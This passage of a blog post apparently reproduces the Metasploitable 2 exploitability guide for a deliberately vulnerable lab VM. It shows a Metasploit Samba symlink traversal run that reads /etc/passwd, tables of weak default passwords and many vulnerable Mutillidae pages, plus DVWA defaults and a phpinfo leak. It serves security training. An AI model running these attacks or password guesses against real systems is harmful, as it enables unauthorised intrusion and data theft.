auxiliary/admin/smb/samba_symlink_traversal</span><br><span class="line">msf  auxiliary(samba_symlink_traversal) &gt; set <span class="title class_">RHOST</span> <span class="number">192.168</span>.<span class="number">99.131</span></span><br><span class="line">msf  auxiliary(samba_symlink_traversal) &gt; set <span class="title class_">SMBSHARE</span> tmp</span><br><span class="line">msf  auxiliary(samba_symlink_traversal) &gt; exploit</span><br><span class="line">                       </span><br><span class="line">[*] <span class="title class_">Connecting</span> to the server...</span><br><span class="line">[*] <span class="title class_">Trying</span> to mount writeable share <span class="string">&#x27;tmp&#x27;</span>...</span><br><span class="line">[*] <span class="title class_">Trying</span> to link <span class="string">&#x27;rootfs&#x27;</span> to the root filesystem...</span><br><span class="line">[*] <span class="title class_">Now</span> access the following share to browse the root <span class="symbol">filesystem:</span></span><br><span class="line">[*]     \\<span class="number">192.168</span>.<span class="number">99.131</span>\tmp\rootfs\</span><br><span class="line">                       </span><br><span class="line">msf  auxiliary(samba_symlink_traversal) &gt; exit</span><br><span class="line">                       </span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># smbclient //192.168.99.131/tmp</span></span><br><span class="line"><span class="title class_">Anonymous</span> login successful</span><br><span class="line"><span class="title class_">Domain</span>=[<span class="title class_">WORKGROUP</span>] <span class="title class_">OS</span>=[<span class="title class_">Unix</span>] <span class="title class_">Server</span>=[<span class="title class_">Samba</span> <span class="number">3.0</span>.<span class="number">20</span>-<span class="title class_">Debian</span>]</span><br><span class="line"><span class="symbol">smb:</span> \&gt; cd rootfs</span><br><span class="line"><span class="symbol">smb:</span> \rootfs\&gt; cd etc</span><br><span class="line"><span class="symbol">smb:</span> \rootfs\etc\&gt; more passwd</span><br><span class="line">getting file \rootfs\etc\passwd of size <span class="number">1624</span> as /tmp/smbmore.ufiyQf (<span class="number">317.2</span> <span class="title class_">KiloBytes</span>/sec) (average <span class="number">317.2</span> <span class="title class_">KiloBytes</span>/sec)</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line">[..]</span><br></pre></td></tr></table></figure>
<h2 id="weak-passwords"><a class="markdownIt-Anchor" href="#weak-passwords"></a> Weak Passwords</h2>
<p>In additional to the more blatant backdoors and misconfigurations, Metasploitable 2 has terrible password security for both system and database server accounts. The primary administrative user <code>msfadmin</code> has a password matching the username. By discovering the list of users on this system, either by using another flaw to capture the passwd file, or by enumerating these user IDs via Samba, a brute force attack can be used to quickly access multiple user accounts. At a minimum, the following weak system accounts are configured on the system.</p>
<table>
<thead>
<tr>
<th>Account Name</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>msfadmin</td>
<td>msfadmin</td>
</tr>
<tr>
<td>user</td>
<td>user</td>
</tr>
<tr>
<td>postgres</td>
<td>postgres</td>
</tr>
<tr>
<td>sys</td>
<td>batman</td>
</tr>
<tr>
<td>klog</td>
<td>123456789</td>
</tr>
<tr>
<td>service</td>
<td>service</td>
</tr>
</tbody>
</table>
<p>In addition to these system-level accounts, the PostgreSQL service can be accessed with username <code>postgres</code> and password <code>postgres</code>, while the MySQL service is open to username <code>root</code> with an empty password. The VNC service provides remote desktop access using the password <code>password</code>.</p>
<h2 id="vulnerable-web-services"><a class="markdownIt-Anchor" href="#vulnerable-web-services"></a> Vulnerable Web Services</h2>
<p>Metasploitable 2 has deliberately vulnerable web applications pre-installed. The web server starts automatically when Metasploitable 2 is booted. To access the web applications, open a web browser and enter the URL <code>http://&lt;IP&gt;</code> where <code>&lt;IP&gt;</code> is the IP address of Metasploitable 2. One way to accomplish this is to install Metasploitable 2 as a guest operating system in Virtual Box and change the network interface settings from “NAT” to “Host Only”. (Note: A video tutorial on installing Metasploitable 2 is available <a target="_blank" rel="noopener" href="https://community.rapid7.com/thread/2007">here</a>.)</p>
<p>In this example, Metasploitable 2 is running at IP 192.168.56.101. Browsing to <a target="_blank" rel="noopener" href="http://192.168.56.101/">http://192.168.56.101/</a> shows the web application home page.</p>
<img src="/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111825542.png" class>
<blockquote>
<p>192.168.56/24 is the default “host only” network in Virtual Box. IP address are assigned starting from “101”. Depending on the order in which guest operating systems are started, the IP address of Metasploitable 2 will vary.</p>
</blockquote>
<p>To access a particular web application, click on one of the links provided. Individual web applications may additionally be accessed by appending the application directory name onto <code>http://&lt;IP&gt;</code> to create URL <code>http://&lt;IP&gt;/&lt;Application Folder&gt;/</code>. For example, the Mutillidae application may be accessed (in this example) at address <code>http://192.168.56.101/mutillidae/</code>. The applications are installed in Metasploitable 2 in the <code>/var/www</code> directory. (Note: See a list with command <code>ls /var/www</code>.) In the current version as of this writing, the applications are</p>
<ul>
<li>mutillidae (NOWASP Mutillidae 2.1.19)</li>
<li>dvwa (Damn Vulnerable Web Application)</li>
<li>phpMyAdmin</li>
<li>tikiwiki (TWiki)</li>
<li>tikiwiki-old</li>
<li>dav (WebDav)</li>
</ul>
<h2 id="mutillidae"><a class="markdownIt-Anchor" href="#mutillidae"></a> Mutillidae</h2>
<p>The Mutillidae web application (<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/mutillidae/">NOWASP (Mutillidae)</a>) contains all of the vulnerabilities from the OWASP Top Ten plus a number of other vulnerabilities such as HTML-5 web storage, forms caching, and click-jacking. Inspired by DVWA, Mutillidae allows the user to change the “Security Level” from 0 (completely insecure) to 5 (secure). Additionally three levels of hints are provided ranging from “Level 0 - I try harder” (no hints) to “Level 2 - noob” (Maximum hints). If the application is damaged by user injections and hacks, clicking the “Reset DB” button resets the application to its original state.</p>
<blockquote>
<p>Tutorials on using Mutillidae are available at the <a target="_blank" rel="noopener" href="https://www.youtube.com/user/webpwnized">webpwnized</a> YouTube Channel.</p>
</blockquote>
<img src="/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111908345.png" class>
<p>Enable hints in the application by click the “Toggle Hints” button on the menu bar:</p>
<img src="/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111920096.png" class>
<p>The Mutillidae application contains at least the following vulnerabilities on these respective pages:</p>
<table>
<thead>
<tr>
<th>Page</th>
<th>Vulnerabilities</th>
</tr>
</thead>
<tbody>
<tr>
<td>add-to-your-blog.php</td>
<td>SQL Injection on blog entry  <br>SQL Injection on logged in user name  <br>Cross site scripting on blog entry  <br>Cross site scripting on logged in user name  <br>Log injection on logged in user name  <br>CSRF  <br>JavaScript validation bypass  <br>XSS in the form title via logged in username  <br>The show-hints cookie can be changed by user to enable hints even though they are not supposed to show in secure mode</td>
</tr>
<tr>
<td>arbitrary-file-inclusion.php</td>
<td>System file compromise  <br>Load any page from any site</td>
</tr>
<tr>
<td>browser-info.php</td>
<td>XSS via referer HTTP header  <br>JS Injection via referer HTTP header  <br>XSS via user-agent string HTTP header</td>
</tr>
<tr>
<td>capture-data.php</td>
<td>XSS via any GET, POST, or Cookie</td>
</tr>
<tr>
<td>captured-data.php</td>
<td>XSS via any GET, POST, or Cookie</td>
</tr>
<tr>
<td>config.inc*</td>
<td>Contains unencrytped database credentials</td>
</tr>
<tr>
<td>credits.php</td>
<td>Unvalidated Redirects and Forwards</td>
</tr>
<tr>
<td>dns-lookup.php</td>
<td>Cross site scripting on the host/ip field  <br>O/S Command injection on the host/ip field  <br>This page writes to the log. SQLi and XSS on the log are possible  <br>GET for POST is possible because only reading POSTed variables is not enforced.</td>
</tr>
<tr>
<td>footer.php*</td>
<td>Cross site scripting via the HTTP_USER_AGENT HTTP header.</td>
</tr>
<tr>
<td>framing.php</td>
<td>Click-jacking</td>
</tr>
<tr>
<td>header.php*</td>
<td>XSS via logged in user name and signature  <br>The Setup/reset the DB menu item can be enabled by setting the uid value of the cookie to 1</td>
</tr>
<tr>
<td>html5-storage.php</td>
<td>DOM injection on the add-key error message because the key entered is output into the error message without being encoded</td>
</tr>
<tr>
<td>index.php*</td>
<td>You can XSS the hints-enabled output in the menu because it takes input from the hints-enabled cookie value.  <br>You can SQL injection the UID cookie value because it is used to do a lookup  <br>You can change your rank to admin by altering the UID value  <br>HTTP Response Splitting via the logged in user name because it is used to create an HTTP Header  <br>This page is responsible for cache-control but fails to do so  <br>This page allows the X-Powered-By HTTP header  <br>HTML comments  <br>There are secret pages that if browsed to will redirect user to the phpinfo.php page. This can be done via brute forcing</td>
</tr>
<tr>
<td>log-visit.php</td>
<td>SQL injection and XSS via referer HTTP header  <br>SQL injection and XSS via user-agent string</td>
</tr>
<tr>
<td>login.php</td>
<td>Authentication bypass SQL injection via the username field and password field  <br>SQL injection via the username field and password field  <br>XSS via username field  <br>JavaScript validation bypass</td>
</tr>
<tr>
<td>password-generator.php</td>
<td>JavaScript injection</td>
</tr>
<tr>
<td>pen-test-tool-lookup.php</td>
<td>JSON injection</td>
</tr>
<tr>
<td>phpinfo.php</td>
<td>This page gives away the PHP server configuration  <br>Application path disclosure  <br>Platform path disclosure</td>
</tr>
<tr>
<td>process-commands.php</td>
<td>Creates cookies but does not make them HTML only</td>
</tr>
<tr>
<td>process-login-attempt.php</td>
<td>Same as login.php. This is the action page.</td>
</tr>
<tr>
<td>redirectandlog.php</td>
<td>Same as credits.php. This is the action page</td>
</tr>
<tr>
<td>register.php</td>
<td>SQL injection and XSS via the username, signature and password field</td>
</tr>
<tr>
<td>rene-magritte.php</td>
<td>Click-jacking</td>
</tr>
<tr>
<td>robots.txt</td>
<td>Contains directories that are supposed to be private</td>
</tr>
<tr>
<td>secret-administrative-pages.php</td>
<td>This page gives hints about how to discover the server configuration</td>
</tr>
<tr>
<td>set-background-color.php</td>
<td>Cascading style sheet injection and XSS via the color field</td>
</tr>
<tr>
<td>show-log.php</td>
<td>Denial of Service if you fill up the log  <br>XSS via the hostname, client IP, browser HTTP header, Referer HTTP header, and date fields</td>
</tr>
<tr>
<td>site-footer-xss-discusson.php</td>
<td>XSS via the user agent string HTTP header</td>
</tr>
<tr>
<td>source-viewer.php</td>
<td>Loading of any arbitrary file including operating system files.</td>
</tr>
<tr>
<td>text-file-viewer.php</td>
<td>Loading of any arbitrary web page on the Interet or locally including the sites password files.  <br>Phishing</td>
</tr>
<tr>
<td>user-info.php</td>
<td>SQL injection to dump all usernames and passwords via the username field or the password field  <br>XSS via any of the displayed fields. Inject the XSS on the register.php page.  <br>XSS via the username field</td>
</tr>
<tr>
<td>user-poll.php</td>
<td>Parameter pollution  <br>GET for POST  <br>XSS via the choice parameter  <br>Cross site request forgery to force user choice</td>
</tr>
<tr>
<td>view-someones-blog.php</td>
<td>XSS via any of the displayed fields. They are input on the add to your blog page.</td>
</tr>
</tbody>
</table>
<h2 id="dvwa"><a class="markdownIt-Anchor" href="#dvwa"></a> DVWA</h2>
<p>From the DVWA home page: “Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.”.</p>
<p>DVWA contains instructions on the home page and additional information is available at <a target="_blank" rel="noopener" href="https://code.google.com/archive/p/dvwa/wikis">Wiki Pages - Damn Vulnerable Web App</a>.</p>
<ul>
<li><strong>Default username</strong> - admin</li>
<li><strong>Default password</strong> - password</li>
</ul>
<img src="/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111940017.png" class>
<h2 id="information-disclosure"><a class="markdownIt-Anchor" href="#information-disclosure"></a> Information Disclosure</h2>
<p>Additionally, an ill-advised PHP information disclosure page can be found at <code>http://&lt;IP&gt;/phpinfo.php</code>. In this example, the URL would be <a target="_blank" rel="noopener" href="http://192.168.56.101/phpinfo.php">http://192.168.56.101/phpinfo.php</a>. The PHP info information disclosure vulnerability provides internal system information and service version information that can be used to look up vulnerabilities. For example, noting that the version of PHP disclosed in the screenshot is version 5.2.4, it may be possible that the system is vulnerable to <a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823">CVE-2012-1823</a> and <a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2311">CVE-2012-2311</a> which affected PHP before 5.3.12 and 5.4.x before 5.4.2.</p>
<img src="/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111947046.png" class>
<p>You can download Metasploitable 2 <a target="_blank" rel="noopener" href="https://information.rapid7.com/metasploitable-download.html">here</a>.</p>

      </section>
      <section class="post-footer">
        <div class="post-share">
          <span class="post-info-label">Share</span>
          <a title="Twitter" aria-label="Twitter" class="twitter" target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=Metasploitable 2 Exploitability Guide&url=http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/index.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
						<i class="icon icon-twitter" aria-hidden="true"></i>
					</a>
          <a title="Facebook" aria-label="Facebook" class="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/index.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
						<i class="icon icon-facebook" aria-hidden="true"></i>
					</a>
          <a title="LinkedIn" aria-label="LinkedIn" class="linkedin" target="_blank" rel="noopener" href="https://www.linkedin.com/shareArticle?mini=true&url=http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/index.html&title=Metasploitable 2 Exploitability Guide" onclick="window.open(this.href, 'linkedin-share', 'width=550,height=520');return false;">
            <i class="icon icon-linkedin" aria-hidden="true"></i>
          </a>
        </div>
        
          <aside class="post-tags">
            <span class="post-info-label">Tags</span>
            
              <a class="post-tag" href="/tags/CTF/" rel="tag">CTF</a>
            
          </aside>
        
      </section>
    </div>

  </article>
</main>
<script>
  $(document).ready(function () {
		var viewport = $(window);
		var post = $('.post-content');
		// Responsive videos with fitVids
    post.fitVids();
		// Format code blocks and add line numbers
		function codestyling() {
	    $('pre code').each(function(i, e) {
				// Code highlight
	      hljs.highlightElement(e);
	      // No lines for plain text blocks
	      if (!$(this).hasClass('language-text')) {
	        var code = $(this);
					// Calculate amount of lines
	        var lines = code.html().split(/\n(?!$)/g).length;
	        var numbers = [];
	        if (lines > 1) {
	          lines++;
	        }
	        for (i = 1; i < lines; i++) {
	          numbers += '<span class="line" aria-hidden="true">' + i + '</span>';
	        }
	        code.parent().append('<div class="lines">' + numbers + '</div>');
	      }
	    });
	  }
	  codestyling();
		// Reading progress bar on window top
	  function readingProgress() {
			var postBottom = post.offset().top + post.height();
			var viewportHeight = viewport.height();
      var progress = 100 - (((postBottom - (viewport.scrollTop() + viewportHeight) + viewportHeight / 3) / (postBottom - viewportHeight + viewportHeight / 3)) * 100);
      $('.progress-bar').css('width', progress + '%');
      (progress > 100) ? $('.progress-container').addClass('complete'): $('.progress-container').removeClass('complete');
	  }
	  readingProgress();
		// Trigger reading progress
	  viewport.on({
	    'scroll': function() {
	      readingProgress();
	    },
	    'resize': function() {
	      readingProgress();
	    },
	    'orientationchange': function() {
	      readingProgress();
	    }
	  });
  });
</script>
    <div class="nav-footer">
  <nav class="nav-wrapper">
    <span class="nav-copy">lance &copy; 2024  <a class="nav-rss" title="RSS" href="/rss/" target="_blank"><i class="icon icon-rss" aria-hidden="true"></i></a></span>

  </nav>
</div>

  </section>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> -->
</body>
</html>
